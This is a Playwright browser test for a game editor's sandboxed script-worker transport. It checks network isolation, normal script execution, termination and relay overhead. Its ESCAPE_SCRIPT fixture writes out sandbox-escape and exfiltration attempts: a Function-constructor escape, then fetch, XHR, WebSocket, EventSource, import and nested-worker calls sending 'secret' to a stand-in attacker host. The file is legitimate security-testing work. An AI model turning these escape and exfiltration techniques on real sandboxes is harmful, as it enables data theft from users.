/**
 * Real-browser proof for the sandboxed-origin script transport (#8700).
 *
 * jsdom enforces neither `sandbox` nor CSP, so the unit tests can only check
 * the configuration. This spec runs it in Chromium:
 *
 *   1. An escaped script — `(0).constructor.constructor('return fetch')()` —
 *      cannot get a single request out of the page: not same-origin, not a
 *      cross-origin `no-cors` POST, not `import()`, `importScripts`, XHR,
 *      WebSocket, EventSource or a nested worker. Run with
 *      `revokeNetworkGlobals()` STUBBED OUT of the worker, and the script
 *      confirms `fetch` is a live function, so the result is the frame's doing
 *      and not the enumeration's.
 *   2. A normal script still runs end to end through the transport: `onStart`
 *      and `onUpdate` post forge commands that arrive on the main thread.
 *   3. `terminate()` kills the worker.
 *   4. The relay's per-tick cost, measured against a plain Worker.
 *
 * What is REAL: `sandboxOrigin.ts` (bundled from source, including its default
 * worker-source loader path), `scriptWorker.ts` bundled by
 * `scripts/sandbox-worker-loader.cjs` — the same function the Next.js loader
 * calls, so these are the bytes production ships — and the editor's own CSP
 * (`buildContentSecurityPolicy({ allowUnsafeEval: true })`) on the host page,
 * which the srcdoc frame inherits.
 *
 * What is SUBSTITUTED: the editor page. A minimal host page on a fake origin
 * stands in for `useScriptRunner` — no engine, no stores, no Next server — so
 * that every request the browser makes is one this spec served or recorded.
 * Hence the substitution annotation and title marker (#10158).
 *
 * "No request left the page" is asserted at the ROUTE layer: `context.route`
 * sees every request the browser would put on the network. CDP's `request`
 * event is NOT that — Chromium announces some worker loads (the XHR, the
 * dynamic import) before the renderer's CSP check cancels them, so they show up
 * as `request` + `requestfailed` without ever reaching the route. The spec
 * records both and asserts that each such announcement failed.
 */
import { test, expect, type BrowserContext, type Page } from '@playwright/test';
import { createRequire } from 'node:module';
import path from 'node:path';
import * as esbuild from 'esbuild';
import { buildContentSecurityPolicy } from '../../src/lib/security/csp';

interface SandboxWorkerLoader {
  bundleScriptWorker(options?: { minify?: boolean; plugins?: esbuild.Plugin[] }): Promise<{ code: string; inputs: string[] }>;
  toModuleSource(code: string): string;
}

const requireCjs = createRequire(__filename);
const WEB_ROOT = path.resolve(__dirname, '..', '..');
const loader = requireCjs(path.join(WEB_ROOT, 'scripts', 'sandbox-worker-loader.cjs')) as SandboxWorkerLoader;

const APP_ORIGIN = 'https://editor.sandbox-harness.test';
const ATTACKER_ORIGIN = 'https://attacker.sandbox-harness.test';
const HARNESS_ASSETS = [`GET ${APP_ORIGIN}/`, `GET ${APP_ORIGIN}/harness.js`];

/** Replaces revokeNetworkGlobals.ts in the worker bundle for the escape test only. */
const stubRevocation: esbuild.Plugin = {
  name: 'stub-revoke-network-globals',
  setup(build) {
    build.onLoad({ filter: /[\\/]revokeNetworkGlobals\.ts$/ }, () => ({
      loader: 'ts',
      contents:
        'export function revokeNetworkGlobals(): void {}\n' +
        'export function revokeNetworkGlobalsIfWorker(): boolean { return false; }\n',
    }));
  },
};

let harnessScript = '';
let productionWorker = '';
let unrevokedWorker = '';

test.beforeAll(async () => {
  productionWorker = (await loader.bundleScriptWorker()).code;
  const unrevoked = await loader.bundleScriptWorker({ plugins: [stubRevocation] });
  unrevokedWorker = unrevoked.code;
  // The stub must actually have replaced the module (lessons-learned #19):
  // same graph, different bytes.
  expect(unrevoked.inputs.some((input) => input.endsWith('revokeNetworkGlobals.ts'))).toBe(true);
  expect(unrevokedWorker).not.toBe(productionWorker);

  // The host page's script: the REAL sandboxOrigin module. Its placeholder import
  // gets exactly what the Next.js loader emits for it.
  const harness = await esbuild.build({
    stdin: {
      contents:
        "import { createSandboxedScriptHost } from './src/lib/scripting/sandboxOrigin';\n" +
        '(window as unknown as { __sandbox: unknown }).__sandbox = { createSandboxedScriptHost };\n',
      resolveDir: WEB_ROOT,
      loader: 'ts',
      sourcefile: 'harness-entry.ts',
    },
    absWorkingDir: WEB_ROOT,
    bundle: true,
    format: 'iife',
    platform: 'browser',
    target: 'es2022',
    write: false,
    logLevel: 'silent',
    plugins: [
      {
        name: 'sandbox-worker-loader',
        setup(build) {
          build.onLoad({ filter: /[\\/]scriptWorkerSource\.bundle\.ts$/ }, () => ({
            loader: 'js',
            contents: loader.toModuleSource(productionWorker),
          }));
        },
      },
    ],
  });
  harnessScript = harness.outputFiles[0].text;
  expect(harnessScript).toContain('spawnforge:script-sandbox:boot');
});

interface NetworkLog {
  routed: string[];
  announced: string[];
  failed: Map<string, string>;
  websockets: string[];
}

async function openHarness(context: BrowserContext): Promise<{ page: Page; net: NetworkLog }> {
  const net: NetworkLog = { routed: [], announced: [], failed: new Map(), websockets: [] };
  await context.route('**/*', async (route) => {
    const request = route.request();
    const key = `${request.method()} ${request.url()}`;
    net.routed.push(key);
    if (key === HARNESS_ASSETS[0]) {
      return route.fulfill({
        status: 200,
        contentType: 'text/html',
        headers: { 'content-security-policy': buildContentSecurityPolicy({ allowUnsafeEval: true }) },
        body: '<!doctype html><html><head><script src="/harness.js"></script></head><body></body></html>',
      });
    }
    if (key === HARNESS_ASSETS[1]) {
      return route.fulfill({ status: 200, contentType: 'text/javascript', body: harnessScript });
    }
    // Anything else would be an escape. Answer it as a willing attacker would,
    // so a leak cannot hide behind a network error.
    return route.fulfill({ status: 200, contentType: 'text/plain', body: 'received' });
  });
  const page = await context.newPage();
  page.on('request', (request) => net.announced.push(`${request.method()} ${request.url()}`));
  page.on('requestfailed', (request) =>
    net.failed.set(`${request.method()} ${request.url()}`, request.failure()?.errorText ?? ''),
  );
  page.on('websocket', (ws) => net.websockets.push(ws.url()));
  await page.goto(`${APP_ORIGIN}/`);
  await page.waitForFunction(() => 'createSandboxedScriptHost' in ((window as unknown as { __sandbox?: object }).__sandbox ?? {}));
  return { page, net };
}

interface RunResult {
  messages: Array<{ type: string; [key: string]: unknown }>;
  errors: string[];
}

/**
 * Start a host in the page, send init (+ optional ticks), and collect every
 * message until `until` matches one, or the timeout passes.
 */
async function runInSandbox(
  page: Page,
  opts: { source?: string; scripts: Array<{ entityId: string; source: string }>; ticks?: number; until: string },
): Promise<RunResult> {
  return page.evaluate(
    ({ source, scripts, ticks, until }) =>
      new Promise<RunResult>((resolve) => {
        const api = (window as unknown as {
          __sandbox: {
            createSandboxedScriptHost: (o: Record<string, unknown>) => {
              postMessage(m: unknown): void;
              onmessage: ((e: MessageEvent) => void) | null;
              terminate(): void;
            };
          };
        }).__sandbox;
        const messages: RunResult['messages'] = [];
        const errors: string[] = [];
        const host = api.createSandboxedScriptHost({
          // undefined => the module's own default loader, i.e. the bundled string.
          loadWorkerSource: source === undefined ? undefined : () => Promise.resolve(source),
          onError: (message: string) => errors.push(message),
        });
        (window as unknown as { __host: unknown }).__host = host;
        const finish = () => resolve({ messages, errors });
        host.onmessage = (event) => {
          const data = event.data as RunResult['messages'][number];
          messages.push(data);
          if (JSON.stringify(data).includes(until)) finish();
        };
        host.postMessage({
          type: 'init',
          scripts: scripts.map((s) => ({ ...s, enabled: true })),
          entities: {},
          entityInfos: {},
          inputState: { pressed: {}, justPressed: {}, justReleased: {}, axes: {} },
        });
        for (let i = 1; i <= (ticks ?? 0); i++) {
          host.postMessage({ type: 'tick', dt: 0.016, elapsed: i * 0.016, entities: {}, entityInfos: {}, inputState: {} });
        }
        setTimeout(finish, 15_000);
      }),
    opts,
  );
}

const logs = (result: RunResult, prefix: string) =>
  result.messages
    .filter((m) => m.type === 'log' && typeof m.message === 'string' && (m.message as string).startsWith(prefix))
    .map((m) => (m.message as string).slice(prefix.length));

/** Every escape attempt an author could reach from `(0).constructor.constructor`. */
const ESCAPE_SCRIPT = `
function onStart() {
  var F = (0).constructor.constructor;
  var scope = F('return self')();
  var violations = [];
  scope.addEventListener('securitypolicyviolation', function (v) {
    violations.push(v.effectiveDirective + ' ' + v.blockedURI);
  });
  var realFetch = F('return fetch')();
  forge.log('probe:fetch-type:' + typeof realFetch);
  forge.log('probe:origin:' + F('return self.origin')());
  var SAME = ${JSON.stringify(APP_ORIGIN)};
  var CROSS = ${JSON.stringify(ATTACKER_ORIGIN)};
  function settle(fn) {
    return new Promise(function (resolve, reject) {
      try { Promise.resolve(fn()).then(resolve, reject); } catch (e) { reject(e); }
    });
  }
  function viaEvents(open) {
    return function () {
      return new Promise(function (resolve, reject) { open(resolve, reject); });
    };
  }
  var attempts = [
    ['fetch-same-origin', function () { return realFetch(SAME + '/api/exfil?d=secret', { method: 'POST', body: 'secret' }); }],
    ['fetch-cross-origin-no-cors-post', function () { return realFetch(CROSS + '/collect', { mode: 'no-cors', method: 'POST', body: 'secret' }); }],
    ['fetch-via-prototype', function () { return Object.getPrototypeOf(scope).fetch.call(scope, CROSS + '/proto', { mode: 'no-cors', method: 'POST', body: 'secret' }); }],
    // Script loads are governed by script-src, not connect-src. The editor's own
    // (inherited) policy already refuses a foreign host, so the SAME-origin
    // pair is what proves the frame's script-src names no network source.
    ['dynamic-import-same-origin', function () { return F('u', 'return import(u)')(SAME + '/_next/static/chunk.js?d=secret'); }],
    ['dynamic-import-cross-origin', function () { return F('u', 'return import(u)')(CROSS + '/module.js?d=secret'); }],
    ['import-scripts-same-origin', function () { return F('return importScripts')()(SAME + '/_next/static/chunk.js?d=secret'); }],
    ['import-scripts-cross-origin', function () { return F('return importScripts')()(CROSS + '/classic.js?d=secret'); }],
    ['xhr', viaEvents(function (resolve, reject) {
      var X = F('return XMLHttpRequest')();
      var x = new X(); x.open('POST', CROSS + '/xhr'); x.onload = function () { resolve(x.status); };
      x.onerror = function () { reject(new Error('xhr error')); }; x.send('secret');
    })],
    ['websocket', viaEvents(function (resolve, reject) {
      var W = F('return WebSocket')();
      var s = new W('wss://attacker.sandbox-harness.test/ws'); s.onopen = function () { resolve('open'); };
      s.onerror = function () { reject(new Error('ws error')); };
    })],
    ['event-source', viaEvents(function (resolve, reject) {
      var E = F('return EventSource')();
      var s = new E(CROSS + '/sse'); s.onopen = function () { resolve('open'); };
      s.onerror = function () { s.close(); reject(new Error('sse error')); };
    })],
    ['nested-worker-fetch', viaEvents(function (resolve, reject) {
      var Wk = F('return Worker')(); var B = F('return Blob')(); var U = F('return URL')();
      var src = 'fetch(' + JSON.stringify(CROSS + '/nested') + ',{mode:"no-cors",method:"POST",body:"secret"}).then(function(){postMessage("sent")},function(e){postMessage("blocked:"+e.name)})';
      var w = new Wk(U.createObjectURL(new B([src])));
      w.onmessage = function (m) { m.data === 'sent' ? resolve(m.data) : reject(new Error(m.data)); };
      w.onerror = function (e) { reject(new Error('nested worker error')); };
    })],
  ];
  Promise.all(attempts.map(function (a) {
    return settle(a[1]).then(
      function (r) { forge.log('probe:result:' + a[0] + ':resolved:' + String(r && r.type || r)); },
      function (e) { forge.log('probe:result:' + a[0] + ':rejected:' + (e && e.name) + ':' + (e && e.message)); }
    );
  })).then(function () {
    forge.log('probe:violations:' + JSON.stringify(violations));
    forge.log('probe:done');
  });
}
`;

test.describe(
  'Script sandbox isolation (#8700) [substituted: editor page] @ui',
  { annotation: { type: 'substitution', description: 'editor page' } },
  () => {
    test('an escaped script cannot make any network request, with revokeNetworkGlobals stubbed out', async ({ context }) => {
      const { page, net } = await openHarness(context);
      const result = await runInSandbox(page, {
        source: unrevokedWorker,
        scripts: [{ entityId: 'attacker', source: ESCAPE_SCRIPT }],
        until: 'probe:done',
      });
      expect(result.errors).toEqual([]);
      expect(logs(result, 'probe:').at(-1)).toBe('done');

      // The enumeration is OFF: the constructor chain hands back a live fetch.
      // Whatever blocks the requests below, it is not revokeNetworkGlobals().
      expect(logs(result, 'probe:fetch-type:')).toEqual(['function']);
      // The frame is an opaque origin: no cookies or storage of the editor's.
      expect(logs(result, 'probe:origin:')).toEqual(['null']);

      const outcomes = logs(result, 'probe:result:');
      // Every attempt ran and settled — none silently skipped (lessons #11).
      expect(outcomes).toHaveLength(11);
      for (const outcome of outcomes) {
        expect(outcome, outcome).toMatch(/:rejected:/);
      }
      // The browser says why: CSP, in the frame's policy.
      const violations = JSON.parse(logs(result, 'probe:violations:')[0] ?? '[]') as string[];
      expect(violations.some((v) => v.startsWith('connect-src '))).toBe(true);
      expect(violations.some((v) => v.startsWith('script-src'))).toBe(true);

      // THE assertion: nothing reached the network but the two files this spec served.
      expect(net.routed).toEqual(HARNESS_ASSETS);
      expect(net.websockets).toEqual([]);
      // Any request CDP announced beyond those was cancelled before sending.
      for (const announced of net.announced.filter((r) => !HARNESS_ASSETS.includes(r))) {
        expect(net.failed.get(announced), announced).toBeTruthy();
      }
      test.info().annotations.push({ type: 'csp-violations', description: violations.join(' | ') });
    });

    test('a normal script runs end to end through the sandboxed transport, with revocation still on', async ({ context }) => {
      const { page, net } = await openHarness(context);
      const script = `
        function onStart() {
          forge.setPosition(entityId, 1, 2, 3);
          forge.log('started:' + typeof (0).constructor.constructor('return fetch')());
        }
        var n = 0;
        function onUpdate(dt) {
          n += 1;
          forge.setPosition(entityId, n, dt, 0);
          if (n === 3) forge.log('three-ticks');
        }
      `;
      // Wait for tick 3's COMMANDS, not its log: the worker posts forge.log
      // immediately and flushes commands at the end of the tick.
      // No `source`: the host loads the worker through its own default path —
      // the string the build-time loader put in scriptWorkerSource.bundle.ts.
      const result = await runInSandbox(page, { scripts: [{ entityId: 'player', source: script }], ticks: 3, until: '"position":[3,' });
      expect(result.errors).toEqual([]);

      const commands = result.messages
        .filter((m) => m.type === 'commands')
        .flatMap((m) => m.commands as Array<Record<string, unknown>>);
      expect(commands[0]).toEqual({ cmd: 'update_transform', entityId: 'player', position: [1, 2, 3] });
      expect(commands.slice(1).map((c) => (c.position as number[])[0])).toEqual([1, 2, 3]);
      // Production bytes still revoke: belt-and-braces inside the frame.
      expect(logs(result, 'started:')).toEqual(['undefined']);
      expect(logs(result, 'three-ticks')).toEqual(['']);
      expect(net.routed).toEqual(HARNESS_ASSETS);
    });

    test('terminate() ends the worker, even one that never yields', async ({ context }) => {
      const { page } = await openHarness(context);
      const workerStarted = page.waitForEvent('worker');
      await runInSandbox(page, {
        scripts: [{ entityId: 'spin', source: "function onStart() { forge.log('spinning'); }" }],
        until: 'spinning',
      });
      const worker = await workerStarted;
      const closed = new Promise<void>((resolve) => worker.once('close', () => resolve()));
      // Spin the worker's thread so it can never read a terminate message: only
      // discarding the frame can stop it.
      await page.evaluate(() => {
        const host = (window as unknown as { __host: { postMessage(m: unknown): void; terminate(): void } }).__host;
        host.postMessage({ type: 'init', scripts: [{ entityId: 'spin', enabled: true, source: 'function onStart(){ var F=(0).constructor.constructor; F("for(;;){}")(); }' }] });
      });
      await page.evaluate(() => (window as unknown as { __host: { terminate(): void } }).__host.terminate());
      await closed;
      expect(await page.locator('iframe').count()).toBe(0);
    });

    test('relay cost per tick against a plain Worker (measurement, loose bound)', async ({ context }) => {
      const { page } = await openHarness(context);
      const ROUNDS = 200;
      const measured = await page.evaluate(
        async ({ source, rounds }) => {
          const script = { entityId: 'bench', enabled: true, source: 'function onUpdate(dt) { forge.setPosition(entityId, dt, 0, 0); }' };
          const init = { type: 'init', scripts: [script], entities: {}, entityInfos: {}, inputState: {} };
          type Port = { postMessage(m: unknown): void; onmessage: ((e: MessageEvent) => void) | null };
          const roundTrips = async (port: Port) => {
            let waiting: (() => void) | null = null;
            port.onmessage = (event) => {
              if ((event.data as { type?: string }).type === 'commands' && waiting) waiting();
            };
            port.postMessage(init);
            const times: number[] = [];
            let batchStart = 0;
            for (let i = 0; i < rounds + 20; i++) {
              if (i === 20) batchStart = performance.now();
              const t0 = performance.now();
              await new Promise<void>((resolve) => {
                waiting = resolve;
                port.postMessage({ type: 'tick', dt: 0.016, elapsed: i, entities: {}, entityInfos: {}, inputState: {} });
              });
              if (i >= 20) times.push(performance.now() - t0); // skip warm-up
            }
            // performance.now() is coarsened to 100 us outside cross-origin
            // isolation, so a single round trip reads as 0.0 or 0.1; the batch
            // mean is the finer number.
            const mean = (performance.now() - batchStart) / rounds;
            times.sort((a, b) => a - b);
            return { mean, p50: times[Math.floor(times.length / 2)], p95: times[Math.floor(times.length * 0.95)] };
          };
          const direct = new Worker(URL.createObjectURL(new Blob([source], { type: 'text/javascript' })));
          const baseline = await roundTrips(direct);
          direct.terminate();
          const api = (window as unknown as { __sandbox: { createSandboxedScriptHost: (o: object) => Port & { terminate(): void } } }).__sandbox;
          const host = api.createSandboxedScriptHost({});
          const sandboxed = await roundTrips(host);
          host.terminate();
          return { baseline, sandboxed };
        },
        { source: productionWorker, rounds: ROUNDS },
      );
      const overhead = measured.sandboxed.mean - measured.baseline.mean;
      test.info().annotations.push({
        type: 'relay-overhead',
        description:
          `per-tick round trip over ${ROUNDS} ticks: plain Worker mean ${measured.baseline.mean.toFixed(3)} ms ` +
          `(p50 ${measured.baseline.p50.toFixed(1)}, p95 ${measured.baseline.p95.toFixed(1)}); sandboxed mean ` +
          `${measured.sandboxed.mean.toFixed(3)} ms (p50 ${measured.sandboxed.p50.toFixed(1)}, p95 ` +
          `${measured.sandboxed.p95.toFixed(1)}); relay overhead ${overhead.toFixed(3)} ms per tick`,
      });
      // A deliberately loose bound — this is a measurement, not a perf gate. The
      // worker's own 16 ms onUpdate warning times the hook INSIDE the worker, so
      // relay latency cannot trip it; this only guards against a pathological relay.
      expect(measured.sandboxed.p50).toBeLessThan(16);
    });
  },
);
